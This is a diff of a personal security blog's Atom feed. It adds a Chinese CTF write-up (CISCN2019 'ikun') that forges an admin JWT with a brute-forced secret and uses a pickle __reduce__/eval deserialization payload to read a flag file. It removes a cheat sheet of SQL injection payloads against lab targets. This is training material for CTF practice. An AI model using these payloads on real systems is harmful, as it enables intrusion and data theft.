@@ -6,7 +6,7 @@
   <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
   
   <link href="https://sakurahack-y.github.io/"/>
-  <updated>2021-10-19T16:10:08.221Z</updated>
+  <updated>2021-10-20T15:57:31.863Z</updated>
   <id>https://sakurahack-y.github.io/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CISCN2019 华北赛区 Day1 Web2 ikun_0x10-0x1F</title>
+    <link href="https://sakurahack-y.github.io/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/"/>
+    <id>https://sakurahack-y.github.io/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/</id>
+    <published>2021-10-20T15:35:31.000Z</published>
+    <updated>2021-10-20T15:57:31.863Z</updated>
+    
+    <content type="html"><![CDATA[<p>一打开页面，很魔性。。</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020233731895.png" alt="image-20211020233731895"></p><p>先注册个账号</p><p>下面提示一定要买到lv6</p><p>翻了好几面，没有找到，于是写了一个简单的爬虫脚本：S</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234222133.png" alt="image-20211020234222133"></p><p>注意爬虫要慢一点，buu很容易崩。</p><pre><code class="python">import urllib.requestimport timefor i in range(0,1000):    url = &#39;http://272059db-2e14-4adc-ae85-8f5a64a35acb.node4.buuoj.cn:81/shop?page=&#39;+str(i)    print(url)    time.sleep(1)    response = urllib.request.urlopen(url).read().decode(&#39;utf-8&#39;)    if &#39;lv6.png&#39; in response:        print(i)        break</code></pre><p>发现在181面</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234439410.png" alt="image-20211020234439410"></p><p>不过钱却不太够，用burp抓下包试一试</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234524015.png" alt="image-20211020234524015"></p><p>发现discount=0.8，将它改小</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234610565.png" alt="image-20211020234610565"></p><p>发现只允许admin登录</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234638452.png" alt="image-20211020234638452"></p><p>仔细分析下数据包，发现了jwt，解一下码：</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235006767.png" alt="image-20211020235006767"></p><p>爆破一下（感觉这个挺靠运气和字典吧）</p><p>发现密钥为 1Kun</p><p>重新生成admin的jwt</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235300543.png" alt="image-20211020235300543"></p><p>查看源代码:</p><p>在这里发现源码泄露：</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235354388.png" alt="image-20211020235354388"></p><p>下载下来，找到一个叫admin.py的文件，打开</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235429287.png" alt="image-20211020235429287"></p><p>看到了pickle，查阅资料可知：</p><p>假设你有一个字典，你想存储它，稍后再取出来。你可以把它的内容写入一个文件，小心翼翼地确保使用了正确地格式，要把它读取出来，你可以使用 exec() 或处理文件输入。但是这种方法并不可靠：如果你使用纯文本来存储重要数据，数据很容易以多种方式被破坏或者修改，导致你的程序崩溃，更糟糕的情况下，还可能在你的计算机上运行恶意代码。因此，我们要pickle它:</p><pre><code>import pickledata = &#123;&#39;foo&#39;: [1,2,3],                &#39;bar&#39;: (&#39;Hello&#39;, &#39;world!&#39;),                &#39;baz&#39;: True&#125;jar = open(&#39;data.pkl&#39;, &#39;wb&#39;)pickle.dump(data, jar) # 将pickle后的数据写入jar文件jar.close()</code></pre><p>过了几个小时，我们想把它取出来，我们只需要反pickle它:</p><pre><code>import picklepkl_file = open(&#39;data.pkl&#39;, &#39;rb&#39;) # 与pickle后的数据连接data = pickle.load(pkl_file) # 把它加载进一个变量print datapkl_file.close()</code></pre><p>将会发生什么？正如你期待的，它就是我们之前的 data 。</p><p>现在，还需要谨慎地说一句：  pickle并不完美。Pickle文件很容易因为事故或被故意的破坏掉。Pickling或许比纯文本文件安全一些，但是依然有可能被用来运行恶意代码。而且它还不支持跨Python版本，所以不要指望分发pickle对象之后所有人都能正确地读取。然而不管怎么样，它依然是一个强有力的工具，可以用于缓存和其他类型的持久化工作。</p><h3 id="11-13-2-Pickle你的对象"><a href="#11-13-2-Pickle你的对象" class="headerlink" title="11.13.2. Pickle你的对象"></a><a href="http://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id53">11.13.2. Pickle你的对象</a></h3><p>Pickle不仅仅可以用于内建类型，任何遵守pickle协议的类都可以被pickle。Pickle协议有四个可选方法，可以让类自定义它们的行为（这和C语言扩展略有不同，那不在我们的讨论范围之内）。</p><ul><li> <strong>getinitargs</strong>(self)</li></ul><p>  如果你想让你的类在反pickle时调用 <strong>init</strong> ，你可以定义__getinitargs__(self) ，它会返回一个参数元组，这个元组会传递给__init__ 。注意，这个方法只能用于旧式类。</p><ul><li> <strong>getnewargs</strong>(self)</li></ul><p>  对新式类来说，你可以通过这个方法改变类在反pickle时传递给 <strong>new</strong> 的参数。这个方法应该返回一个参数元组。</p><ul><li> <strong>getstate</strong>(self)</li></ul><p>  你可以自定义对象被pickle时被存储的状态，而不使用对象的 <strong>dict</strong> 属性。 这个状态在对象被反pickle时会被 <strong>setstate</strong> 使用。</p><ul><li> <strong>setstate</strong>(self)</li></ul><p>  当一个对象被反pickle时，如果定义了 <strong>setstate</strong> ，对象的状态会传递给这个魔法方法，而不是直接应用到对象的 <strong>dict</strong> 属性。这个魔法方法和__getstate__ 相互依存：当这两个方法都被定义时，你可以在Pickle时使用任何方法保存对象的任何状态。</p><ul><li> <strong>reduce</strong>(self)</li></ul><p>  当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 <strong>setstate</strong> 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）；</p><ul><li> <strong>reduce_ex</strong>(self)</li></ul><p>  <strong>reduce_ex</strong> 的存在是为了兼容性。如果它被定义，在pickle时__reduce_ex__ 会代替 <strong>reduce</strong> 被调用。 <strong>reduce</strong> 也可以被定义，用于不支持 <strong>reduce_ex</strong> 的旧版pickle的API调用。</p><p>这里构造payload,传给become：</p><pre><code>import pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a</code></pre><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235644482.png" alt="image-20211020235644482"></p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235657704.png" alt="image-20211020235657704"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;一打开页面，很魔性。。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020233731895.</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
+    
+    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
+    
+    
+    <category term="jwt" scheme="https://sakurahack-y.github.io/tags/jwt/"/>
+    
+  </entry>
   
   <entry>
     <title>通过LD_PRELOAD与putenv组合拳绕过disable_functions函数</title>
@@ -533,32 +560,6 @@ import has</summary>
     
     
     <category term="xml" scheme="https://sakurahack-y.github.io/tags/xml/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sql常用注入手法</title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/sql/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/sql/</id>
-    <published>2021-10-08T15:12:23.969Z</published>
-    <updated>2021-10-08T15:09:07.410Z</updated>
-    
-    <content type="html"><![CDATA[<p>MySQL 中的 RIGHT(s，n) 函数返回字符串 s 最右边的 n 个字符。可配合extractvalue进行完全显示<br>sql报错盲注：<br>union系列：<br>爆出数据库：<br>127.0.0.1/sqli-labs/Less-5/?id=1’ union Select 1,count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a  – +</p><p>如果想一个一个显示，那么把group_concat去掉，再加上limit 0,1<br>127.0.0.1/sqli-labs/Less-5/?id=1’ union Select 1,count(*),concat(0x3a,0x3a,(select schema_name from information_schema.schemata limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a  – +</p><p>爆出表:<br><a href="http://127.0.0.1/sqli-labs/Less-5/?id=1&#39;">http://127.0.0.1/sqli-labs/Less-5/?id=1&#39;</a> union Select 1,count(*),concat(0x3a,0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=’security’  ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a  – +</p><p>updatexml:<br>payload:-1’and updatexml(1,concat(0x7e,database(),0x7e),1)%23 其中updatexml(1,concat(0x7e, ,0x7e),1),是基本格式，0x7e是十六进制的“~”，用来让查询到的东西更显眼。我们只需要在两个0x7e中间加入要查询的语句就可以了。<br>爆出当前数据库：<br><a href="http://127.0.0.1/sqli-labs/Less-5/?id=-1&#39;and">http://127.0.0.1/sqli-labs/Less-5/?id=-1&#39;and</a> updatexml(1,concat(0x7e,database(),0x7e),1)–+<br>updatexml（）这个函数最多只能爆32位字符，而我们要爆的数据超过了这个位数，所以我们一个一个的查，使用limit 0，1来实现。</p><p>^extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>同updatexml一样，限制长度也是32位。<br> se//mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误  。和updatexml语法一样注意参数不同就可以了。<br>！！！ select()   select 与()之间不要加空格</p><p><a href="http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=%27%5Eextractvalue(1,concat(0x7e,(select(database())),0x7e))%23">http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=%27^extractvalue(1,concat(0x7e,(select(database())),0x7e))%23</a></p><p>username=aaa&amp;password=aaa’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’))))%23<br>#语句主要用()绕过了空格，用like绕过了=号</p><p><a href="http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=&#39;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e))%23">http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=&#39;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e))%23</a></p><p>select exp(<del>(select * FROM(SELECT USER())a)) //double 数值类<br>型超出范围<br>//Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上<br><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;">http://127.0.0.1/sqllib/Less-5/?id=1&#39;</a> union select (exp(</del>(select * FROM(SELECT USER())a))),2, 3–+</p><p>select !(select * from (select user())x) -（ps:这是减号） <del>0<br>//bigint 超出范围；</del>0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上</p><p><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;">http://127.0.0.1/sqllib/Less-5/?id=1&#39;</a> union select (!(select * from (select user())x) - ~0),2,3-<br>-+</p><p>延时注入：<br><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;and">http://127.0.0.1/sqllib/Less-5/?id=1&#39;and</a> If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p><p>联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据<br>利用/<em>!union</em>/可以绕过对union的过滤<br>异或<br>可以起到代替or的作用<br>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p><p>SQL注入一点小技巧<br>当 = 被过滤时，用 regexp 来代替 = ，用 &lt;&gt; 代替 !=</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;MySQL 中的 RIGHT(s，n) 函数返回字符串 s 最右边的 n 个字符。可配合extractvalue进行完全显示&lt;br&gt;sql报错盲注：&lt;br&gt;union系列：&lt;br&gt;爆出数据库：&lt;br&gt;127.0.0.1/sqli-labs/Less-5/?id=1’ uni</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
-    
-    <category term="SQL" scheme="https://sakurahack-y.github.io/categories/CTF/SQL/"/>
-    
-    
-    <category term="sql" scheme="https://sakurahack-y.github.io/tags/sql/"/>
     
   </entry>
   
